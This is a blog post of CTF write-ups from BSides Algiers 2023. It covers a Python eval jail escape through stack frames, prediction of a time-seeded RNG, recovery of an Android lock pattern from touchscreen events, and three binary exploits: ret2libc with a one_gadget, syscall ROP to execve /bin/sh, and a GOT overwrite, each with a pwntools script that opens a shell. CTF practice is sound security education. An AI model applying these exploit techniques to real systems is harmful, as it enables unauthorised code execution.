@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>bsides algiers CTF 2023 writeups. &mdash; karudo's nerd shit</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/x-icon" href="./favicon.png">
+  </head>
+  <body>
+  
+    <nav class="menu">
+      <div class="nav-left">
+        <ul>
+          <li><a href="index.html"><img class="logo" src="./favicon.png" alt="" />karudo's nerd shit</a></li>
+        </ul>
+      </div>
+      <div class="nav-right">
+        <ul>
+          <li><a href="mailto:itskarudo@protonmail.com">contact</a></li>
+          <li><a href="https://twitter.com/itskarudo">twitter</a></li>
+          <li><a href="https://github.com/itskarudo">github</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <article>
+<h1 id="bsides%20algiers%20CTF%202023%20writeups.">bsides algiers CTF 2023 writeups.</h1>
+
+<p>last weekend I took a part in the bsides algiers CTF 2023 organized by shellmates club, these are writeups for some of the challenges I solved:</p>
+
+<h2 id="Broken_Base64">Broken_Base64</h2>
+
+<p>no idea, used chatgpt ¯\<em>(ツ)</em>&#47;¯</p>
+
+<h3 id="flag">flag</h3>
+
+<pre><code>shellmates{Y0u_h4V3_70_uNd3r5t4nD_H0w_B45364_w0Rk5}
+</code></pre>
+
+<h2 id="Can%20you%20guess?">Can you guess?</h2>
+
+<h3 id="recon">recon</h3>
+
+<p>we are given 2 python files, <code>chall.py</code> and <code>jail.py</code>:</p>
+
+<h3 id="%3Ccode%3Echall.py%3C/code%3E"><code>chall.py</code></h3>
+
+<pre><code class="language-python">import multiprocessing as mp
+from jail import guess
+
+# This is for challenge setup only
+if __name__ == &#39;__main__&#39;:
+    print(&#39;Welcome to the game! I give you the possibility to execute whatever you want but I dare you to guess it right...&#39;)
+    inp = input(&#39;&#62;&#62; &#39;)
+    guessed = mp.Value(&#39;b&#39;, False)
+
+    
+    child_proc = mp.Process(target=guess, args=(inp,guessed,))
+    child_proc.start()
+
+    child_proc.join(timeout=3600)
+
+    if guessed.value == True:
+        with open(&#39;flag.txt&#39;) as f:
+            print(f.read())
+    else:
+        print("Told you, no flags will be given for you")
+
+    if child_proc.exitcode is None:
+        child_proc.terminate()
+
+</code></pre>
+
+<h3 id="%3Ccode%3Ejail.py%3C/code%3E"><code>jail.py</code></h3>
+
+<pre><code class="language-python">
+def jail(inp):
+    return eval(inp)
+
+def guess(inp, guessed):
+    import os, random
+
+    os.setregid(65534, 65534), os.setreuid(65534, 65534)
+    try:
+        r = jail(inp)
+        if random.random() == r:
+            print(&#39;That\&#39;s right, but you ain\&#39;t get any flags&#39;)
+            guessed.value = False
+    except Exception as e:
+        print("Don&#39;t break my jail")
+
+</code></pre>
+
+<p>basically what&#8217;s going on here is, <code>chall.py</code> is allocating a shared memory region called <code>guessed</code>, reads user input into <code>inp</code> and calls <code>jail.guess()</code> from <code>jail.py</code>, which calls <code>jail(inp)</code> and evaluates the user input, after that it checks if the result equals a random number chosen, if so it sets <code>guessed.value</code> to <code>False</code>.</p>
+
+<p>notice that the only way to read the flag is if <code>guessed.value == True</code>, which is never the case, so we need to find a way to override it.</p>
+
+<h3 id="the%20call%20stack">the call stack</h3>
+
+<p>at this point I started looking into ways to traverse the call stack frames, this way I can access the <code>guess()</code> frame (parent) from the <code>jail()</code> frame (where we&#8217;re currently at), and I came across the <a href="https://docs.python.org/3/library/inspect.html"><code>inspect</code></a> module in python.</p>
+
+<h3 id="dirty%20python%20tricks">dirty python tricks</h3>
+
+<p>since we&#8217;re in an <code>eval</code> and not an <code>exec</code>, we can&#8217;t just import stuff the python way (<code>import os</code>), nor can we set attributes the usual way <code>foo.bar = 5</code>, we would have to use some tricks such as <code>__import__(&#39;os&#39;)</code> and <code>setattr(foo, "bar", 5)</code>.</p>
+
+<h3 id="final%20exploit">final exploit</h3>
+
+<pre><code class="language-python">setattr(__import__(&#39;inspect&#39;).getargvalues(__import__(&#39;inspect&#39;).currentframe().f_back.f_back).locals[&#39;guessed&#39;], "value", True)
+</code></pre>
+
+<h3 id="flag-2">flag</h3>
+
+<pre><code>shellmates{PYTHOn_FR4mE_0bj3cTs_ARENT_s3CuR3_ARE_Th3y}
+</code></pre>
+
+<h2 id="SRNG">SRNG</h2>
+
+<h3 id="recon-2">recon</h3>
+
+<p>we are given a single python script:</p>
+
+<pre><code class="language-python">#!&#47;usr&#47;bin&#47;env python
+from flag import FLAG
+import time
+
+class Spooder:
+    def __init__(self):
+         self.rand, self.i = int(time.time()), 2
+         self.generate_random()
+
+    def generate_random(self, m: int = 0x10ffff) -&#62; int:
+        self.rand = pow(self.i, self.rand, m)
+        self.i = self.i + 1
+        return self.rand
+
+    def generate_padding(self, l: int = 0x101) -&#62; str:
+        padding = &#39;&#39;
+        for i in range(self.generate_random(l)):
+            padding += chr(self.generate_random(0xd7fb))
+        return padding
+
+spooder = Spooder()
+
+def spooder_encryption(message: str) -&#62; str:
+    pad = spooder.generate_padding()
+    message = &#39;&#39;.join([chr(ord(c) ^ spooder.generate_random(0xd7fb)) for c in message])
+    cipher = pad + message
+    return cipher
+
+if __name__ == &#39;__main__&#39;:
+
+    welcome = f&#39;&#39;&#39;
+               ▗▄▖ ▗▄▄▖ ▗▄ ▗▖  ▄▄
+              ▗▛▀▜ ▐▛▀▜▌▐█ ▐▌ █▀▀▌
+              ▐▙   ▐▌ ▐▌▐▛▌▐▌▐▌
+               ▜█▙ ▐███ ▐▌█▐▌▐▌▗▄▖
+                 ▜▌▐▌▝█▖▐▌▐▟▌▐▌▝▜▌
+              ▐▄▄▟▘▐▌ ▐▌▐▌ █▌ █▄▟▌
+               ▀▀▘ ▝▘ ▝▀▝▘ ▀▘  ▀▀
+    \n
+    This is not the RNG the world wants, and it&#39;s not the RNG the world need, but this is the RNG that the world gets.
+    Welcome to the Spooder Random Number Generator, or special random number generator.
+    It can generate random numbers like this: {&#39;, &#39;.join([str(spooder.generate_random()) for _ in range(spooder.generate_random(121))])}.
+    It can also generate random strings like this: {spooder.generate_padding(53)}.
+    You can also use it to encrypt secrets like this: {spooder_encryption(FLAG).encode().hex()}.
+    Here is a free trial:
+    1. Generate random string.
+    2. Generate random number.
+    3. Encrypt.
+    &#39;&#39;&#39;
+
+    print(welcome)
+    tries = spooder.generate_random(7)
+    print(f&#39;You have {tries} tries .&#39;)
+    for _ in reversed(range(tries)):
+        choice = input(&#39;Choose wisely:\n\t&#62; &#39;)
+        if choice == &#39;1&#39;:
+            print(spooder.generate_padding(11))
+        elif choice == &#39;2&#39;:
+            print(spooder.generate_random(101))
+        elif choice == &#39;3&#39;:
+            print(spooder_encryption(input(&#39;what do you want to encrypt?\n\t&#62; &#39;)))
+        else:
+            exit(0)
+
+</code></pre>
+
+<p><strong>TL;DR</strong>:
+the script gets the current time (<code>time.time()</code>) and uses it to generate &#8220;&#8220;&#8220;random&#8221;&#8221;&#8221; numbers which can easily be predicted.</p>
+
+<h3 id="final%20exploit-2">final exploit</h3>
+
+<pre><code class="language-python">from pwn import *
+import time
+
+class Spooder:
+    def __init__(self):
+         self.rand, self.i = int(time.time()), 2
+         self.generate_random()
+
+    def generate_random(self, m: int = 0x10ffff) -&#62; int:
+        self.rand = pow(self.i, self.rand, m)
+        self.i = self.i + 1
+        return self.rand
+
+    def generate_padding(self, l: int = 0x101) -&#62; str:
+        padding = &#39;&#39;
+        for _ in range(self.generate_random(l)):
+            padding += chr(self.generate_random(0xd7fb))
+        return padding
+
+s = Spooder()
+
+def spooder_encryption(message: str) -&#62; str:
+    pad = s.generate_padding()
+    message = &#39;&#39;.join([chr(ord(c) ^ s.generate_random(0xd7fb)) for c in message])
+    cipher = pad + message
+    return cipher
+
+
+n = [str(s.generate_random()) for _ in range(s.generate_random(121))]
+
+p = remote("srng.bsides.shellmates.club", 443, ssl=True)
+
+p.recvuntil(b&#39;this: &#39;)
+nums = p.recvline().decode().strip().split(&#39;, &#39;)
+assert len(nums) == len(n)
+nums[-1] = nums[-1][:-1]
+
+for a, b in zip(nums, n):
+    assert a == b
+
+p.recvuntil(b&#39;this: &#39;)
+s.generate_padding(53)
+
+p.recvuntil(b&#39;this: &#39;)
+pad = s.generate_padding()
+bruh = bytes.fromhex(p.recvline().strip()[:-1].decode()).decode()
+
+for c in bruh[len(pad):]:
+    print(chr(ord(c) ^ s.generate_random(0xd7fb)), end="")
+
+</code></pre>
+
+<h3 id="flag-3">flag</h3>
+
+<pre><code>shellmates{5p00d3R_Fl4g_f0r_sPooDeR_cH4lL3nge}
+</code></pre>
+
+<h2 id="lock%20pattern">lock pattern</h2>
+
+<h3 id="recon-3">recon</h3>
+
+<p>we are given 2 files, <code>assignment.md</code> which explains how we obtained the second file <code>event2</code> and asked to recover the lock screen pattern</p>
+
+<pre><code class="language-bash">adb shell getevent | grep "touchscreen" -A 1  
+adb shell cat &#47;dev&#47;input&#47;event2 &#62; evtx  
+md5sum event2
+#f241a508d5fccea7eb0f33a839a9633f
+</code></pre>
+
+<p>basically, we&#8217;re getting the content of the touchscreen <a href="https://www.kernel.org/doc/Documentation/input/input.txt">input event</a> from an android phone.</p>
+
+<p>looking through documentation, we can see that <code>event2</code> is a binary file with a list of structures describing events, each event follows the following structure:</p>
+
+<pre><code class="language-c">struct input_event {
+    struct timeval time;
+    unsigned short type;
+    unsigned short code;
+    unsigned int value;
+};
+</code></pre>
+
+<p>since we&#8217;re interested in the finger position on the screen we only want events with type <code>EV_ABS (0x03)</code> and codes <code>ABS_MT_POSITION_X (0x35)</code> and <code>ABS_MT_POSITION_Y (0x36)</code>.</p>
+
+<p>at this point it&#8217;s trivial to parse the <code>event2</code> file, extract the <code>(x, y)</code> positions and plot them to get the lock.</p>
+
+<h3 id="final%20exploit-3">final exploit</h3>
+
+<pre><code class="language-python">from pwn import *
+import numpy as np
+import matplotlib.pyplot as plt
+from matplotlib.animation import FuncAnimation
+import struct
+
+f = open(".&#47;event2", "rb")
+
+coords = []
+saved_x = 0
+saved_y = 0
+
+while True:
+    try:
+        time = f.read(4)
+        f.read(4)
+        ty = struct.unpack(&#39;&#60;H&#39;, f.read(2))[0]
+        code = struct.unpack(&#39;&#60;H&#39;, f.read(2))[0]
+        value = struct.unpack(&#39;&#60;I&#39;, f.read(4))[0]
+        if ty == 3:
+            if code == 0x35:
+                saved_x = value
+                coords.append((saved_x, saved_y))
+            elif code == 0x36:
+                saved_y = -value
+                coords.append((saved_x, saved_y))
+    except Exception:
+        break
+
+
+fig, ax = plt.subplots()
+ax.set_xlim(0, 2000)
+ax.set_ylim(-2000, 0)
+point, = ax.plot([], [], &#39;ro&#39;)
+line, = ax.plot([], [], &#39;ro&#39;)
+
+def update(frame):
+    x, y = coords[frame]
+    point.set_data([x], [y])
+    xdata, ydata = line.get_data()
+    xdata = np.append(xdata, x)
+    ydata = np.append(ydata, y)
+    line.set_data(xdata, ydata)
+    return point,
+
+ani = FuncAnimation(fig, update, frames=len(coords), interval=1, blit=True)
+plt.show()
+
+</code></pre>
+
+<h3 id="flag-4">flag</h3>
+
+<p><img src="./lock-pattern-sol.png" alt="Lock schema" /></p>
+
+<pre><code>shellmates{457198632}
+</code></pre>
+
+<h2 id="unaligned">unaligned</h2>
+
+<h3 id="recon-4">recon</h3>
+
+<p>we&#8217;re given an ELF binary <code>unaligned</code>, it gives you a libc leak (address of <code>system()</code>) and reads input overflowing the stack buffer, stack canary is disabled which means we can redirect code execution, classic <code>ret2libc</code>.</p>
+
+<h3 id="alignment">alignment</h3>
+
+<p>our overflow is only 24 bytes, at first glance this might seem enough for an exploit such as:
+<code>python
+payload = b&#39;A&#39;*40 + p64(POP_RDI) + p64(BIN_SH) + p64(system)
+</code></p>
+
+<p>but this will fail due to stack alignment, since the stack is no longer 16-bytes aligned.</p>
+
+<p>the usual way we&#8217;d go about this is to prepend the ROP chain with a <code>ret</code> gadget, but since we don&#8217;t have enough space for that we&#8217;ll have to find another way.</p>
+
+<h3 id="libc%20gadgets">libc gadgets</h3>
+
+<p>using <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> on the provided <code>glibc</code>, we can find the following gadget:</p>
+
+<pre><code class="language-bash">0x4f2a5 execve("&#47;bin&#47;sh", rsp+0x40, environ)
+constraints:
+  rsp &#38; 0xf == 0
+  rcx == NULL
+</code></pre>
+
+<p>the only requirement here is that <code>rcx == NULL</code> (since the first constraints is already satisfied), so we can just set <code>rcx</code> to <code>NULL</code> and jump to the gadget, and this will fit within our 24 bytes overflow</p>
+
+<h3 id="final%20exploit-4">final exploit</h3>
+
+<pre><code class="language-python">from pwn import *
+
+context.binary = elf = ELF(".&#47;unaligned")
+libc = ELF(".&#47;libc.so.6")
+# p = elf.process()
+p = remote("unaligned.bsides.shellmates.club", 443, ssl=True)
+assert p
+
+system = int(p.recvline().strip().decode().split(&#39; &#39;)[1], 16)
+log.info(f"system@{hex(system)}")
+
+libc.address = system - libc.symbols[&#39;system&#39;]
+log.info(f"libc@{hex(libc.address)}")
+
+r = ROP(libc)
+POP_RCX = r.find_gadget(["pop rcx", "ret"]).address
+RET = r.find_gadget(["ret"]).address
+
+
+payload = b&#39;A&#39;*40
+payload += p64(POP_RCX) + p64(0) + p64(libc.address + 0x4f2a5)
+
+p.sendlineafter(b&#39;Name:&#39;, payload)
+
+p.interactive()
+</code></pre>
+
+<h3 id="flag-5">flag</h3>
+
+<pre><code>shellmates{SOrRY_fOR_f0RciBLy_Un$4tify1ng_0ne_g4DGet_CoN$tr41nT$}
+</code></pre>
+
+<h2 id="SYS_ROP">SYS_ROP</h2>
+
+<h3 id="recon-5">recon</h3>
+
+<p>we are given an ELF executable <code>chall</code> which has all mitigations disabled and is not linked against <code>libc</code>.</p>
+
+<p>when examining it we notice that we have a stack buffer overflow, meaning we can ROP (who would&#8217;ve guessed?).</p>
+
+<p>we can find the following gadgets:</p>
+
+<pre><code class="language-bash">0x0000000000401085: pop rax; ret;
+0x000000000040107f: pop rdi; ret;
+0x0000000000401083: pop rdx; ret;
+0x0000000000401081: pop rsi; ret;
+0x000000000040100a: syscall;
+</code></pre>
+
+<p>we can call arbitrary syscalls.</p>
+
+<h3 id="exploit%20plan">exploit plan</h3>
+
+<p>since we don&#8217;t have <code>libc</code>, we will have to call <code>execve("&#47;bin&#47;sh", {"&#47;bin&#47;sh", NULL}, NULL)</code>.</p>
+
+<h3 id="final%20exploit-5">final exploit</h3>
+
+<pre><code class="language-python">from pwn import *
+
+context.binary = elf = ELF(".&#47;chall")
+
+p = remote("sys-rop.bsides.shellmates.club", 443, ssl=True)
+assert p
+
+rw = 0x402010
+POP_RAX = 0x401085
+POP_RDI = 0x40107f
+POP_RSI = 0x401081
+POP_RDX = 0x401083
+SYSCALL = 0x401011
+
+payload = b&#39;A&#39;*88
+payload += p64(POP_RAX) + p64(0)
+payload += p64(POP_RDI) + p64(0)
+payload += p64(POP_RSI) + p64(rw)
+payload += p64(POP_RDX) + p64(32)
+payload += p64(SYSCALL)
+payload += p64(POP_RAX) + p64(0x3b)
+payload += p64(POP_RDI) + p64(rw)
+payload += p64(POP_RSI) + p64(rw+16)
+payload += p64(POP_RDX) + p64(0)
+payload += p64(SYSCALL)
+
+p.sendlineafter(b&#39;message:&#39;, payload)
+
+part2 = b&#39;&#47;bin&#47;sh\0&#39;
+part2 += p64(0)
+part2 += p64(rw)
+part2 += p64(0)
+
+p.sendline(part2)
+
+p.interactive()
+</code></pre>
+
+<h3 id="flag-6">flag</h3>
+
+<pre><code>shellmates{yOu_4rE_a_true_H4CkeR}
+</code></pre>
+
+<h2 id="junior%20pwner">junior pwner</h2>
+
+<p>I&#8217;m getting too lazy to write so here&#8217;s the rough idea:</p>
+
+<ul>
+<li>you can overflow a stack buffer and override the saved <code>rbp</code></li>
+<li>use that overflow to override the <code>messages</code> array and use it to leak a <code>libc</code> address</li>
+<li>use the overflow again to write <code>&#47;bin&#47;sh</code> to the <code>messages</code> array</li>
+<li>override the <code>puts@GOT</code> entry with the address of <code>system()</code></li>
+<li>now next time <code>puts</code> gets called we call <code>system()</code> instead, and since we overwritten all messages with <code>&#47;bin&#47;sh</code>, we guarantee that we pass <code>&#47;bin&#47;sh</code> as the first argument.</li>
+</ul>
+
+<h3 id="final%20exploit-6">final exploit</h3>
+
+<pre><code class="language-python">from pwn import *
+
+context.binary = elf = ELF(".&#47;chall")
+
+libc = ELF(".&#47;libc.so.6")
+
+# p = elf.process()
+p = remote("junior-pwner.bsides.shellmates.club", 443, ssl=True)
+assert p
+
+p.recvline()
+pay1 = p64(elf.got[&#39;puts&#39;])*3
+pay1 += b&#39;A&#39;*(64-len(pay1))
+pay1 += p64(0x4041c0 + 0x50)
+gdb.attach(p)
+p.sendline(pay1)
+n = u64(p.recvline().strip().ljust(8, b&#39;\0&#39;))
+
+libc.address = n - libc.symbols[&#39;puts&#39;]
+log.info(f"libc@{hex(libc.address)}")
+
+p.recv()
+BINSH = next(libc.search(b&#39;&#47;bin&#47;sh\0&#39;))
+log.info(f"&#47;bin&#47;sh @ {hex(BINSH)}")
+pay2 = p64(BINSH)*3
+pay2 += b&#39;A&#39;*(64-len(pay2))
+pay2 += p64(0x4041c0 + 0x50)
+p.sendline(pay2)
+
+p.recv()
+
+pay3 = p64(libc.symbols[&#39;system&#39;])
+pay3 += p64(libc.symbols[&#39;setbuf&#39;])
+pay3 += p64(libc.symbols[&#39;read&#39;])
+pay3 += p64(libc.symbols[&#39;srand&#39;])
+pay3 += p64(libc.symbols[&#39;memcpy&#39;])
+pay3 += p64(libc.symbols[&#39;time&#39;])
+pay3 += p64(libc.symbols[&#39;malloc&#39;])
+pay3 += p64(libc.symbols[&#39;rand&#39;])
+pay3 += b&#39;A&#39;*(64-len(pay3))
+pay3 += p64(elf.got[&#39;puts&#39;] + 0x50)
+p.sendline(pay3)
+
+p.interactive()
+</code></pre>
+
+<h3 id="flag-7">flag</h3>
+
+<pre><code>shellmates{Never_trUst_aSlR_eV3N_jUn1Or$_C0ULd_BRE4K_It!}
+</code></pre>
+</article>
+
+    <footer>
+      <p>&#127279; 2023 itskarudo</p>
+      Created with ♥️ and <a href="https://romanzolotarev.com/ssg.html">ssg</a>
+    </footer>
+
+  </body>
+</html>
